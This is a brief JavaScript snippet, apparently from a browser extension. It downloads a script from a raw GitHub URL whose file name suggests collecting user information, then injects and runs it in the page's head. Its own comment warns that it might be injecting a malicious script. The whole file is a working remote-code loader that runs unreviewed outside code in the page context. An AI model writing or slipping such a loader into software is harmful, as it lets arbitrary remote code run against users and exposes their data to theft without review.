var xhr = new XMLHttpRequest();
xhr.open("GET", "https://raw.githubusercontent.com/vyphotphet100/repo/main/sourceExtensionGetUserInf.js", true);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    // WARNING! Might be injecting a malicious script!
    //var resp = eval("(" + xhr.responseText + ")");

	var script = document.createElement('script');
	script.appendChild(document.createTextNode(xhr.responseText));
	script.setAttribute('type', 'text/javascript');
	document.getElementsByTagName('head')[0].appendChild(script);
  }
}
xhr.send();

